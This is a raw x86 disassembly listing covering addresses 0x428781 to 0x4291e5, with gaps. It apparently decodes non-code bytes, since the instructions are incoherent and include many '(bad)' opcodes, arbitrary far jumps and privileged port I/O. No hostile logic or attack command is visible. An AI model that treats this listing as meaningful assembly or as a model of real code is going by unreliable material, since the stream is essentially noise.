  428781:	adc    BYTE PTR [edi+eax*4+0x69],dl
  428785:	test   DWORD PTR [eax],edx
  428787:	les    edi,FWORD PTR [esi]
  428789:	add    al,0x6e
  42878b:	cmp    BYTE PTR ds:0x73f95ebf,ch
  428791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428792:	clc    
  428793:	push   edi
  428794:	dec    esp
  428795:	push   ebx
  428796:	jne    0x4287e5
  428798:	push   ss
  428799:	push   cs
  42879a:	dec    esi
  42879b:	fild   DWORD PTR [edi]
  42879d:	or     edx,DWORD PTR [esi-0x16930749]
  4287a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4287a4:	nop
  4287a5:	test   eax,0x3b789fcd
  4287aa:	scas   al,BYTE PTR es:[edi]
  4287ab:	and    ecx,ebp
  4287ad:	add    bl,bh
  4287af:	xor    BYTE PTR [esi+edx*8+0x34592ca0],bl
  4287b6:	pushf  
  4287b7:	lea    ebp,[edx+0xb92f7db]
  4287bd:	cmp    eax,0xf6297b87
  4287c2:	cmp    DWORD PTR [esi-0x2e],esp
  4287c5:	and    al,0x0
  4287c7:	jmp    0x8cbb:0x37c6208e
  4287ce:	dec    ebp
  4287cf:	xchg   ebx,eax
  4287d0:	psrad  mm1,QWORD PTR [esi-0x5c1bca6]
  4287d7:	ret    
  4287d8:	cs inc ebx
  4287da:	mov    eax,0x7a14cbdf
  4287df:	cld    
  4287e0:	sub    al,0x2a
  4287e2:	xchg   edi,ecx
  4287e4:	aad    0xcf
  4287e6:	dec    esi
  4287e7:	xor    eax,0x91db89c6
  4287ec:	dec    ebx
  4287ed:	pop    ebx
  4287ee:	rcr    BYTE PTR [esi],0x9f
  4287f1:	or     BYTE PTR [edi-0x71c69b08],al
  4287f7:	sub    DWORD PTR [eax-0x50],ebp
  4287fa:	add    edi,DWORD PTR [ebx+ebp*1]
  4287fd:	ror    DWORD PTR [esi],1
  4287ff:	sub    BYTE PTR [esi],ah
  428801:	(bad)  
  428803:	sar    DWORD PTR [ecx+0x48a16a87],1
  428809:	mov    ecx,0x13a02e97
  42880e:	fcomp  DWORD PTR [ebp+0x2e]
  428811:	jbe    0x428886
  428813:	ins    DWORD PTR es:[edi],dx
  428814:	or     eax,0x1b20e46b
  428819:	sbb    al,0x14
  42881b:	test   BYTE PTR [ebx+0x9],bh
  42881e:	das    
  42881f:	aam    0x9b
  428821:	jae    0x428810
  428823:	test   BYTE PTR [esi-0x2032606d],ah
  428829:	mov    esi,0xede3fc62
  42882e:	push   edx
  42882f:	jo     0x428802
  428831:	inc    eax
  428832:	mov    bl,0x9c
  428834:	outs   dx,BYTE PTR ds:[esi]
	...
  428895:	add    BYTE PTR [esi],ah
  428897:	jp     0x42890a
  428899:	les    edi,FWORD PTR [ebp-0x31]
  42889c:	mov    bh,0xfa
  42889e:	ret    
  42889f:	ja     0x428848
  4288a1:	test   DWORD PTR [ecx-0x22],esp
  4288a4:	inc    edi
  4288a5:	sub    esi,ecx
  4288a7:	mov    al,0x1
  4288a9:	add    BYTE PTR [edi],al
  4288ab:	add    DWORD PTR [eax],eax
  4288ad:	add    BYTE PTR [edx+0x3d81e9f2],bh
  4288b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4288b4:	xchg   esi,eax
  4288b5:	rol    cl,0x4
  4288b8:	fucomp st(2)
  4288ba:	call   0xadb465b5
  4288bf:	aas    
  4288c0:	cmp    dl,BYTE PTR [edx+0x7]
  4288c3:	iret   
  4288c4:	jbe    0x4288af
  4288c6:	test   BYTE PTR [ecx],cl
  4288c8:	jp     0x4288f9
  4288ca:	add    eax,0x7e5fa092
  4288cf:	fisttp WORD PTR [esi]
  4288d1:	or     al,0x46
  4288d3:	sub    cl,al
  4288d5:	popa   
  4288d6:	dec    edx
  4288d7:	je     0x428958
  4288d9:	lahf   
  4288da:	sbb    BYTE PTR [edi],dh
  4288dc:	cmp    DWORD PTR [eax-0x1d],esi
  4288df:	inc    eax
  4288e0:	mov    WORD PTR ds:0x951601cd,ds
  4288e6:	mul    bl
  4288e8:	sub    esi,ecx
  4288ea:	repz mov ebp,0xecbb2ef4
  4288f0:	aad    0x9f
  4288f2:	inc    edi
  4288f3:	call   0xa1fe:0x827c6fd
  4288fa:	mov    ebp,0xd32f8140
  4288ff:	jno    0x428974
  428901:	adc    eax,edx
  428903:	sub    al,0x7e
  428905:	mov    ch,0xa6
  428907:	mov    esi,0xad13766a
  42890c:	cmp    edi,DWORD PTR [ecx+eiz*8-0x46]
  428910:	or     BYTE PTR [ebx+0x334228df],0x80
  428917:	mov    eax,ds:0x1f89a59e
  42891c:	in     al,dx
  42891d:	jp     0x42890d
  42891f:	rol    DWORD PTR [edx],cl
  428921:	clc    
  428922:	jg     0x428914
  428924:	ins    DWORD PTR es:[edi],dx
  428925:	test   al,bl
  428927:	int    0x3a
  428929:	aaa    
  42892a:	pop    ds
  42892b:	call   0xe64d:0x4c2746b2
  428932:	push   ebp
  428933:	push   edi
  428934:	(bad)  
  428935:	push   cs
  428936:	and    eax,0x92508a6c
  42893b:	xor    eax,0xe4566043
  428940:	mov    al,0x59
  428942:	and    DWORD PTR [ebp+0xa],esi
  428945:	push   edi
  428946:	out    0x5a,eax
  428948:	or     eax,0xa75bd274
  42894d:	push   esp
  42894e:	js     0x42893b
  428950:	int3   
  428951:	mov    cl,0xe6
  428953:	jmp    0x428938
  428955:	and    al,0xd
  428957:	and    al,0x57
  428959:	sbb    esi,esp
  42895b:	xchg   BYTE PTR [ebx+ecx*1],ah
  42895e:	mov    es,WORD PTR [edi-0x75630df3]
  428964:	mov    esp,0xb2d5a272
  428969:	fld    TBYTE PTR [edi]
  42896b:	pop    esp
  42896c:	dec    ecx
  42896d:	sub    ah,BYTE PTR [ebx]
  42896f:	cli    
  428970:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428971:	push   es
  428972:	nop
  428973:	test   eax,0x77725f1f
  428978:	(bad)  
  428979:	mov    cl,0xec
  42897b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42897c:	or     ch,dl
  42897e:	sbb    bh,BYTE PTR [edx+0x67]
  428981:	xchg   edi,eax
  428982:	or     BYTE PTR [ecx-0x46f2412c],ch
  428988:	aam    0x98
  42898a:	dec    edi
  42898b:	or     al,BYTE PTR [esi+eiz*4+0x2341e9cd]
  428992:	(bad)  
  428993:	lock inc ecx
  428995:	fs out dx,al
  428997:	pop    edx
  428998:	test   eax,0x834b76c
  42899d:	out    0x74,eax
  42899f:	dec    esp
  4289a0:	stc    
  4289a1:	add    DWORD PTR [ebx+0x43],ebp
  4289a4:	push   es
  4289a5:	push   esi
  4289a6:	or     bh,bl
  4289a8:	mov    ah,BYTE PTR [esi+ecx*4+0x20]
  4289ac:	sbb    eax,0xadd4400
  4289b1:	int    0xf6
  4289b3:	adc    al,0x17
	...
  428a15:	add    BYTE PTR [ebp+0xc],cl
  428a18:	clc    
  428a19:	pop    ebx
  428a1a:	stc    
  428a1b:	(bad)  
  428a1c:	out    dx,eax
  428a1d:	push   ds
  428a1e:	push   ss
  428a1f:	xchg   edx,eax
  428a20:	data16 aas 
  428a22:	daa    
  428a23:	jne    0x428a30
  428a25:	idiv   al
  428a27:	mov    cl,0x1
  428a29:	add    BYTE PTR [edi],al
  428a2b:	add    DWORD PTR [eax],eax
  428a2d:	add    BYTE PTR [edx+0x29d8989b],dh
  428a33:	or     DWORD PTR [ebx-0x7118fa2e],0x2e
  428a3a:	fcmovnbe st,st(7)
  428a3c:	pop    ebx
  428a3d:	pop    es
  428a3e:	push   cs
  428a3f:	jmp    0x428a65
  428a41:	add    ch,0xe4
  428a44:	pop    edi
  428a45:	pop    es
  428a46:	scas   eax,DWORD PTR es:[edi]
  428a47:	mov    WORD PTR [ebp-0x69eafa2b],?
  428a4d:	jg     0x4289d7
  428a4f:	outs   dx,BYTE PTR ds:[esi]
  428a50:	sti    
  428a51:	pop    edx
  428a52:	push   0xffffffe4
  428a54:	outs   dx,BYTE PTR ds:[esi]
  428a55:	adc    al,0xf6
  428a57:	das    
  428a58:	xor    al,BYTE PTR [ebx-0x1c]
  428a5b:	fsub   QWORD PTR [ebp-0x582c2a73]
  428a61:	sbb    DWORD PTR [ebp+0x2495eac6],0x785b9ad0
  428a6b:	mov    al,0xe4
  428a6d:	mov    ebx,0xb8efa511
  428a72:	dec    esi
  428a73:	or     DWORD PTR [ecx+0x3a2f2d3c],ecx
  428a79:	imul   ebp,DWORD PTR [ebp+0x5a],0xaf42daa3
  428a80:	mov    ebp,0xa7667d1c
  428a85:	mov    ecx,edx
  428a87:	cmp    eax,0x4224c2fc
  428a8c:	push   edx
  428a8d:	fcom   DWORD PTR [ebx+0x4e7be809]
  428a93:	push   edx
  428a94:	dec    edi
  428a95:	std    
  428a96:	sub    eax,0x969942d3
  428a9b:	or     al,0xd2
  428a9d:	xchg   ebx,eax
  428a9e:	and    ch,bl
  428aa0:	inc    edx
  428aa1:	loope  0x428b0d
  428aa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428aa4:	mov    fs,edi
  428aa6:	sub    ecx,DWORD PTR [ebx+0x51]
  428aa9:	inc    eax
  428aaa:	out    0x38,eax
  428aac:	xor    eax,0xe6de17c2
  428ab1:	inc    ebx
  428ab2:	fidivr WORD PTR ds:0xec88d1ba
  428ab8:	sub    BYTE PTR gs:[esi-0x1c],cl
  428abc:	fucom  st(0)
  428abe:	push   0xbe59951c
  428ac3:	push   edi
  428ac4:	push   ss
  428ac5:	scas   eax,DWORD PTR es:[edi]
  428ac6:	cs sahf 
  428ac8:	hlt    
  428ac9:	adc    DWORD PTR [ebp+0x3],ecx
  428acc:	loopne 0x428b0a
  428ace:	shr    BYTE PTR [esi],cl
  428ad0:	dec    esp
  428ad1:	push   0xdf469d96
  428ad6:	cmp    BYTE PTR [eax+0x4c5f7397],0x25
  428add:	hlt    
  428ade:	jl     0x428b07
  428ae0:	cmp    DWORD PTR [ecx+0x4b],esp
  428ae3:	mov    esi,0x2001b5a2
  428ae8:	popf   
  428ae9:	adc    edx,esi
  428aeb:	mov    ebp,0xd3866938
  428af0:	shl    eax,0x9f
  428af3:	pop    es
  428af4:	test   ebx,esi
  428af6:	clc    
  428af7:	mov    dl,0x9
  428af9:	mov    BYTE PTR [ecx+0x16f4aa47],dl
  428aff:	push   esi
  428b00:	sar    DWORD PTR [ecx-0x3e],0x25
  428b04:	mov    dh,0xf8
  428b06:	fmul   QWORD PTR [ebp+0x73ec259b]
  428b0c:	mov    cl,0x6c
  428b0e:	inc    eax
  428b0f:	xor    bh,BYTE PTR [ecx-0x132477fc]
  428b15:	push   ebp
  428b16:	sub    BYTE PTR [ebp+0x510e928f],0x92
  428b1d:	sbb    eax,0xa294d707
  428b22:	mov    ebx,0x20c985cf
  428b27:	add    al,BYTE PTR [ebp+0x7c]
  428b2a:	inc    BYTE PTR [eax+ecx*2+0x24]
  428b2e:	cmp    BYTE PTR [eax-0x173802c9],ah
  428b34:	push   eax
	...
  428b95:	add    ch,al
  428b97:	push   ebp
  428b98:	mov    bh,dl
  428b9a:	call   0x5fb1:0xb77ff5ff
  428ba1:	test   eax,0x13827439
  428ba6:	push   DWORD PTR [edx+0x1070001]
  428bac:	add    BYTE PTR [eax],al
  428bae:	test   DWORD PTR [esp+ecx*4-0x76f22b32],edi
  428bb5:	cmp    BYTE PTR [eax-0x1c],al
  428bb8:	or     BYTE PTR [ebx-0x18ae9ea],bh
  428bbe:	pushf  
  428bbf:	and    ebp,0xd2f35a67
  428bc5:	cmp    ebx,DWORD PTR [edi+0x1d]
  428bc8:	inc    edx
  428bc9:	cdq    
  428bca:	test   DWORD PTR [edi+0x7b3f34a2],0xd6ab7b95
  428bd4:	les    eax,FWORD PTR [edi+0x48]
  428bd7:	pop    ss
  428bd8:	mov    esi,0x4b5760b
  428bdd:	aad    0x8b
  428bdf:	pop    eax
  428be0:	in     al,dx
  428be1:	jmp    0xe10a:0xe0349766
  428be8:	sbb    cl,BYTE PTR [edi+eiz*4]
  428beb:	ja     0x428b96
  428bed:	icebp  
  428bee:	dec    edx
  428bef:	ins    BYTE PTR es:[edi],dx
  428bf0:	scas   eax,DWORD PTR es:[edi]
  428bf1:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  428bf3:	push   0xfe559b11
  428bf8:	(bad)  
  428bf9:	fdivr  QWORD PTR [ebx+esi*4]
  428bfc:	add    DWORD PTR [ebx-0x8f953a9],ebp
  428c02:	mov    edi,0x39727f25
  428c07:	xchg   esp,eax
  428c08:	ds repz mov dl,0xcd
  428c0c:	rcr    BYTE PTR [edx],1
  428c0e:	or     al,0xd6
  428c10:	loop   0x428b9c
  428c12:	xchg   ebp,eax
  428c13:	cmp    al,0x51
  428c15:	cmc    
  428c16:	jb     0x428c86
  428c18:	out    0x37,eax
  428c1a:	aaa    
  428c1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428c1c:	mov    dh,0x2e
  428c1e:	mov    dl,0x42
  428c20:	(bad)  
  428c21:	mov    bl,0xbe
  428c23:	retf   0x69ae
  428c26:	fcom   st(3)
  428c28:	push   0xffffffe1
  428c2a:	test   DWORD PTR [eax-0x316c03a5],eax
  428c30:	mov    eax,ds:0x1bd88bec
  428c35:	cmc    
  428c36:	pop    esp
  428c37:	stos   BYTE PTR es:[edi],al
  428c38:	rcr    DWORD PTR ss:[ecx],0x55
  428c3c:	hlt    
  428c3d:	mov    bh,0x24
  428c3f:	push   ds
  428c40:	jmp    0x428c65
  428c42:	add    eax,0x72e8f96e
  428c47:	pop    edx
  428c48:	or     esi,DWORD PTR [ebp-0x79]
  428c4b:	cwde   
  428c4c:	jnp    0x428c45
  428c4e:	icebp  
  428c4f:	mov    eax,ds:0xfc9d8d95
  428c54:	cmp    BYTE PTR [eax-0x6f],dl
  428c57:	sub    dl,BYTE PTR [esi]
  428c59:	sbb    eax,0x96cee3b0
  428c5e:	dec    edi
  428c60:	or     al,0x88
  428c62:	(bad)  
  428c63:	daa    
  428c64:	or     BYTE PTR [ecx-0x5],bl
  428c67:	mov    fs,WORD PTR [ebx+0x301956]
  428c6d:	cwde   
  428c6e:	xchg   esi,eax
  428c6f:	add    BYTE PTR [ebp-0x752b6055],dh
  428c75:	adc    eax,0xfbcd4ab1
  428c7a:	adc    ebp,ecx
  428c7c:	aaa    
  428c7d:	test   eax,0xfb5d8a6f
  428c82:	add    BYTE PTR [ecx+esi*1],bl
  428c85:	int    0x12
  428c87:	loop   0x428c2f
  428c89:	fwait
  428c8a:	add    al,0xb
  428c8c:	push   0x2ac8bb65
  428c91:	xchg   ebp,eax
  428c92:	sti    
  428c93:	or     dh,cl
  428c95:	mov    esi,esp
  428c97:	lods   eax,DWORD PTR ds:[esi]
  428c98:	mov    ds:0xbb92f3a8,al
  428c9d:	fwait
  428c9e:	pop    esp
  428c9f:	dec    ebp
  428ca0:	into   
  428ca1:	popf   
  428ca2:	div    DWORD PTR [edi+0x36]
  428ca5:	mov    BYTE PTR [ebp+0x6a0ef1fd],dh
  428cab:	adc    BYTE PTR [edi],dh
  428cad:	dec    edx
  428cae:	mov    al,0x7
  428cb0:	mov    ah,0x44
  428cb2:	fdivr  st,st(6)
  428cb4:	into   
	...
  428d15:	add    BYTE PTR [ecx-0xace0e4b],al
  428d1b:	jne    0x428cde
  428d1d:	mov    ch,0x86
  428d1f:	xchg   esi,eax
  428d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428d21:	jns    0x428d6d
  428d23:	stos   DWORD PTR es:[edi],eax
  428d24:	pop    eax
  428d25:	stos   BYTE PTR es:[edi],al
  428d26:	push   es
  428d27:	mov    ah,0x1
  428d29:	add    BYTE PTR [edi],al
  428d2b:	add    DWORD PTR [eax],eax
  428d2d:	add    dl,dl
  428d2f:	xor    bh,dh
  428d31:	cmp    BYTE PTR [ebp+ebx*1-0x42],bl
  428d35:	lds    edx,FWORD PTR [eax-0x70]
  428d38:	(bad)  [eax-0x2854132]
  428d3e:	mov    eax,0xbea33c6e
  428d43:	test   DWORD PTR [esp+edx*8-0x33],edx
  428d47:	dec    ebp
  428d48:	jb     0x428d59
  428d4a:	popa   
  428d4b:	lods   eax,DWORD PTR ds:[esi]
  428d4c:	jl     0x428d01
  428d4e:	pop    ebp
  428d4f:	cmp    BYTE PTR [eax],ah
  428d51:	pop    ebx
  428d52:	xor    DWORD PTR [edi],esi
  428d54:	sub    eax,0xaed4af04
  428d59:	inc    eax
  428d5a:	inc    edi
  428d5b:	push   cs
  428d5c:	or     edx,DWORD PTR [ebp+0x57486cda]
  428d62:	ins    DWORD PTR es:[edi],dx
  428d63:	(bad)  
  428d64:	and    al,0x17
  428d66:	add    BYTE PTR [ecx+0x3363ae8a],0xba
  428d6d:	pusha  
  428d6e:	repnz rcl DWORD PTR [edx-0x68],cl
  428d72:	stos   DWORD PTR es:[edi],eax
  428d73:	nop
  428d74:	into   
  428d75:	das    
  428d76:	jp     0x428da5
  428d78:	sbb    al,0x9e
  428d7a:	aad    0x58
  428d7c:	aam    0xb6
  428d7e:	mov    eax,ds:0xcee8daca
  428d83:	addr16 pop di
  428d86:	cmp    eax,0x56d77527
  428d8b:	xchg   ebp,eax
  428d8c:	pop    edx
  428d8d:	jmp    0xe01a:0x6f313b4e
  428d94:	xlat   BYTE PTR ds:[ebx]
  428d95:	adc    edx,eax
  428d97:	dec    ebp
  428d98:	or     al,dl
  428d9a:	inc    edx
  428d9b:	jmp    0x428d5a
  428d9d:	push   0x32
  428d9f:	adc    DWORD PTR [esi],edx
  428da1:	xor    eax,0xcae842c7
  428da6:	(bad)  
  428da7:	mov    eax,ss
  428da9:	jb     0x428d9a
  428dab:	pop    edx
  428dac:	pop    ebx
  428dad:	(bad)  
  428dae:	retf   
  428daf:	repnz loop 0x428d5c
  428db2:	pop    es
  428db3:	xor    BYTE PTR [ebp+0x6aa752cf],bh
  428db9:	bound  esp,QWORD PTR [edi]
  428dbb:	aaa    
  428dbc:	rcl    DWORD PTR [ebx-0x249a59d0],1
  428dc2:	(bad)  
  428dc3:	sbb    DWORD PTR [edi],esp
  428dc5:	and    cl,BYTE PTR [ebx+0x6606aa67]
  428dcb:	push   0xffffffa9
  428dcd:	push   eax
  428dce:	push   ebx
  428dcf:	retf   
  428dd0:	inc    ecx
  428dd1:	pushf  
  428dd2:	out    0x39,al
  428dd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428dd5:	mov    esi,0x79c8a56b
  428dda:	mov    cl,0xcf
  428ddc:	and    eax,0xd034cf89
  428de1:	rol    BYTE PTR [ebx],0xf9
  428de4:	inc    edx
  428de5:	xor    al,0xf
  428de7:	imul   esi,DWORD PTR [ecx-0x33],0xffffffd7
  428deb:	xchg   DWORD PTR [ecx-0x7a176e5d],eax
  428df1:	(bad)  
  428df2:	lods   al,BYTE PTR ds:[esi]
  428df3:	js     0x428da7
  428df5:	jne    0x428e24
  428df7:	mov    ah,0x71
  428df9:	mov    ah,0x59
  428dfb:	xor    al,0x5c
  428dfd:	ds (bad) 
  428dff:	push   ss
  428e00:	in     eax,0x84
  428e02:	mov    edx,DWORD PTR [ecx+0x5f]
  428e05:	fwait
  428e06:	push   edi
  428e07:	jae    0x428dba
  428e09:	jno    0x428e4b
  428e0b:	ror    BYTE PTR [esi+edx*8+0x29142de6],cl
  428e12:	push   ecx
  428e13:	imul   edi,DWORD PTR [edi-0x35],0x24b6c47c
  428e1a:	lods   eax,DWORD PTR ds:[esi]
  428e1b:	fld    TBYTE PTR [eax]
  428e1d:	shl    esi,cl
  428e1f:	test   ecx,ebx
  428e21:	cmc    
  428e22:	call   0xa0e6:0x4d78fcf5
  428e29:	xor    BYTE PTR [edi],dh
  428e2b:	(bad)  
  428e2c:	xchg   edi,eax
  428e2d:	scas   al,BYTE PTR es:[edi]
  428e2e:	in     al,dx
  428e2f:	adc    eax,0x86ee247f
  428e34:	mov    DWORD PTR [eax],0x0
	...
  428e96:	dec    edi
  428e97:	pop    ebp
  428e98:	pop    ecx
  428e99:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428e9d:	(bad)  
  428e9f:	cli    
  428ea0:	test   al,0xd9
  428ea2:	dec    esp
  428ea3:	and    esi,DWORD PTR [eax]
  428ea5:	mov    cl,BYTE PTR ds:0x70001b5
  428eab:	add    DWORD PTR [eax],eax
  428ead:	add    BYTE PTR [ecx-0x476dcac7],cl
  428eb3:	jge    0x428f30
  428eb5:	fadd   QWORD PTR [esi]
  428eb7:	inc    eax
  428eb8:	mov    ecx,0xd627b791
  428ebd:	xchg   ecx,eax
  428ebe:	mov    cl,0x65
  428ec0:	cmp    BYTE PTR [esi+0x63771af1],ch
  428ec6:	xor    eax,0xc423de16
  428ecb:	sub    ebp,DWORD PTR ds:0xc0e302e2
  428ed1:	in     al,dx
  428ed2:	(bad)  
  428ed3:	cmp    BYTE PTR [ecx-0x157697df],ch
  428ed9:	ja     0x428ece
  428edb:	push   edx
  428edc:	and    BYTE PTR [ebx-0x78b96b7f],ch
  428ee2:	sbb    BYTE PTR [eax-0x1f20bf7f],dh
  428ee8:	cmp    eax,0x3ea56d0
  428eed:	push   0x12
  428eef:	xchg   esp,eax
  428ef0:	sahf   
  428ef1:	out    dx,al
  428ef2:	rol    DWORD PTR [edi],1
  428ef4:	xchg   edx,eax
  428ef5:	rcl    dh,cl
  428ef7:	jno    0x428efb
  428ef9:	adc    dl,cl
  428efb:	cwde   
  428efc:	(bad)  
  428efd:	out    dx,eax
  428efe:	jae    0x428f3b
  428f00:	mov    dl,0x39
  428f02:	repnz fwait
  428f04:	ret    0x7dd0
  428f07:	int    0x25
  428f09:	loopne 0x428f11
  428f0b:	dec    esp
  428f0c:	fs js  0x428e9d
  428f0f:	fs xor al,0x78
  428f12:	jne    0x428e9b
  428f14:	rcr    BYTE PTR [esi-0x43b4c405],cl
  428f1a:	fldl2t 
  428f1c:	dec    edi
  428f1d:	test   BYTE PTR [edi+0x6b],dl
  428f20:	inc    eax
  428f21:	sbb    bh,dh
  428f23:	or     DWORD PTR [ebp+0x32a201f3],edx
  428f29:	push   cs
  428f2a:	mov    ebx,DWORD PTR [ecx]
  428f2c:	fidiv  WORD PTR ds:0xa9f2e710
  428f32:	add    BYTE PTR [ebx-0x3],dl
  428f35:	sbb    ch,BYTE PTR [ebp+0x1cf14944]
  428f3b:	nop
  428f3c:	outs   dx,DWORD PTR ds:[esi]
  428f3d:	sub    cl,BYTE PTR [edx+0x58]
  428f40:	or     BYTE PTR [edi],bl
  428f42:	out    0x2c,eax
  428f44:	nop
  428f45:	shl    BYTE PTR [eax-0xd],0xed
  428f49:	mov    bl,0x73
  428f4b:	cld    
  428f4c:	shl    DWORD PTR [eax+ebp*2+0x5e],0x8a
  428f51:	add    ebx,edx
  428f53:	jbe    0x428f54
  428f55:	ds dec esp
  428f57:	push   ebx
  428f58:	inc    edx
  428f59:	clc    
  428f5a:	push   eax
  428f5b:	xor    BYTE PTR [esi-0x7f0104e6],bh
  428f61:	ret    0x8ff2
  428f64:	xor    ch,cl
  428f66:	(bad)  
  428f67:	mov    BYTE PTR [ebp+edx*1-0x6b],dl
  428f6b:	imul   ebx,DWORD PTR [ebp*4+0x20b91858],0x24eb396c
  428f76:	int    0x21
  428f78:	jb     0x428f5e
  428f7a:	mov    eax,DWORD PTR [edi+0x10]
  428f7d:	dec    ebx
  428f7e:	hlt    
  428f7f:	jmp    0x4dfc:0xbb28da7f
  428f86:	mov    dl,0xd4
  428f88:	push   edx
  428f89:	mov    edi,0xb06bf6d6
  428f8e:	pop    ecx
  428f8f:	dec    esp
  428f90:	cmp    cl,0xe5
  428f93:	mov    DWORD PTR [edx],edx
  428f95:	sti    
  428f96:	loope  0x428f7c
  428f98:	pushf  
  428f99:	and    bl,BYTE PTR [edx+0x62]
  428f9c:	cmp    al,BYTE PTR [edi+ecx*2+0x1e]
  428fa0:	pop    eax
  428fa1:	in     eax,dx
  428fa2:	inc    eax
  428fa3:	xor    eax,0x6509287
  428fa8:	(bad)  
  428faa:	mov    ebx,0x559bb9de
  428faf:	mov    ds,WORD PTR [ecx]
  428fb1:	in     al,0x75
  428fb3:	in     eax,dx
  428fb4:	push   0x0
	...
  429015:	add    cl,ah
  429017:	in     al,dx
  429018:	mov    ebx,es
  42901a:	(bad)  
  42901b:	jecxz  0x42900c
  42901d:	out    dx,al
  42901e:	arpl   WORD PTR [esi+0x79],cx
  429021:	sbb    DWORD PTR [edx+ebp*1-0x2f],edx
  429025:	pop    ebp
  429026:	adc    al,0xb6
  429028:	add    DWORD PTR [eax],eax
  42902a:	pop    es
  42902b:	add    DWORD PTR [eax],eax
  42902d:	add    dh,ch
  42902f:	stos   BYTE PTR es:[edi],al
  429030:	sahf   
  429031:	nop
  429032:	mov    dl,bl
  429034:	adc    DWORD PTR [ebx],edx
  429036:	mov    eax,0xf33366a4
  42903b:	push   ss
  42903c:	sub    bh,bh
  42903e:	aaa    
  42903f:	aad    0xe
  429041:	adc    dl,BYTE PTR [eax]
  429043:	das    
  429044:	adc    DWORD PTR [esi-0x59],esi
  429047:	fisttp WORD PTR [esi-0x63]
  42904a:	(bad)  
  42904c:	je     0x42905a
  42904e:	xor    al,0xd9
  429050:	add    DWORD PTR [edi-0x80],esi
  429053:	add    DWORD PTR [eax+0x4c],0xc
  429057:	fwait
  429058:	or     al,0x56
  42905a:	add    eax,0xbc70af23
  42905f:	jmp    0xa840:0xc0030883
  429066:	sar    BYTE PTR [ebx+0x5b],0xdf
  42906a:	push   0x30
  42906c:	in     al,0xca
  42906e:	adc    BYTE PTR [edi-0x4d7d66b1],cl
  429074:	out    0x81,al
  429076:	adc    ecx,DWORD PTR [eax-0x7c890710]
  42907c:	repnz and DWORD PTR [ebp-0x5e],esi
  429080:	leave  
  429081:	imul   esp,DWORD PTR [esi],0x6dd715a2
  429087:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429088:	jmp    0x429068
  42908a:	ds adc edx,0x6e
  42908e:	retf   0x5827
  429091:	pop    edx
  429092:	aaa    
  429093:	loopne 0x429036
  429095:	push   ebp
  429096:	sub    ah,dl
  429098:	push   ss
  429099:	addr16 mov ebp,0x69300dff
  42909f:	pop    ds
  4290a0:	mov    eax,gs:0x80dfb950
  4290a6:	jne    0x429042
  4290a8:	jp     0x4290b7
  4290aa:	adc    bl,bl
  4290ac:	jmp    0xea81cf86
  4290b1:	jl     0x429052
  4290b3:	jecxz  0x429105
  4290b5:	or     eax,0xfeba3812
  4290ba:	(bad)  
  4290bb:	jl     0x42907e
  4290bd:	adc    esi,DWORD PTR [esi+eiz*8+0x8]
  4290c1:	jg     0x42907e
  4290c3:	or     DWORD PTR [ebp-0x15927556],ebp
  4290c9:	int3   
  4290ca:	or     ah,BYTE PTR [eax-0x1e]
  4290cd:	shr    dl,1
  4290cf:	fstp   DWORD PTR [eax]
  4290d1:	adc    BYTE PTR [eax],0x7a
  4290d4:	fst    QWORD PTR [ebx+ecx*4-0x150b2b43]
  4290db:	xchg   DWORD PTR [eax-0x7a5d3657],esp
  4290e1:	cdq    
  4290e2:	popf   
  4290e3:	mov    ecx,0xb4f706e9
  4290e8:	xor    DWORD PTR [edx],edx
  4290ea:	loope  0x42912b
  4290ec:	clc    
  4290ed:	jmp    0xd0717de3
  4290f2:	push   ebp
  4290f3:	sbb    BYTE PTR [esi-0x446d6ba4],0xf6
  4290fa:	js     0x429179
  4290fc:	cmp    edx,esi
  4290fe:	xor    al,0x88
  429100:	or     DWORD PTR [ecx],edi
  429102:	and    DWORD PTR [esi+0x60c53057],esp
  429108:	ret    
  429109:	dec    ecx
  42910a:	push   es
  42910b:	xor    eax,0xebb6e05c
  429110:	loop   0x42917f
  429112:	pop    es
  429113:	mov    edx,0xdee5ae5b
  429118:	pop    es
  429119:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42911a:	repnz cdq 
  42911c:	mov    cl,BYTE PTR [ecx-0x1dbbe02d]
  429122:	(bad)  
  429123:	cs popf 
  429125:	mov    ah,ch
  429127:	cli    
  429128:	in     al,dx
  429129:	mov    bh,bh
  42912b:	and    al,0x17
  42912d:	rcl    DWORD PTR [edi+0x7e],1
  429130:	jno    0x42914f
  429132:	bswap  ebx
  429134:	ins    DWORD PTR es:[edi],dx
	...
  429195:	add    BYTE PTR [esi-0x79],dl
  429198:	std    
  429199:	test   ch,bh
  42919b:	(bad)  
  42919c:	jg     0x429175
  42919e:	xor    dh,0xd6
  4291a1:	stos   DWORD PTR es:[edi],eax
  4291a2:	pop    es
  4291a3:	mov    esp,0xb71b21f7
  4291a8:	add    DWORD PTR [eax],eax
  4291aa:	pop    es
  4291ab:	add    DWORD PTR [eax],eax
  4291ad:	add    BYTE PTR [ecx],dl
  4291af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4291b0:	gs cmc 
  4291b2:	arpl   WORD PTR [ecx+0x3c],bx
  4291b5:	adc    BYTE PTR [ecx-0x64],0x39
  4291b9:	mov    ebx,0x89ec6033
  4291be:	neg    BYTE PTR [ecx+0x7e]
  4291c1:	push   es
  4291c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4291c3:	cmp    bl,BYTE PTR [esi+0x5097c333]
  4291c9:	loop   0x4291ec
  4291cb:	inc    edi
  4291cc:	retf   0x768e
  4291cf:	mov    ecx,0xa309f224
  4291d4:	jg     0x429167
  4291d6:	inc    edx
  4291d7:	out    dx,eax
  4291d8:	mov    ds:0xaf531378,eax
  4291dd:	and    al,0x10
  4291df:	(bad)  
  4291e0:	mov    dh,0xfa
  4291e2:	fucomp st(4)
  4291e4:	aaa    
  4291e5:	pop    esp
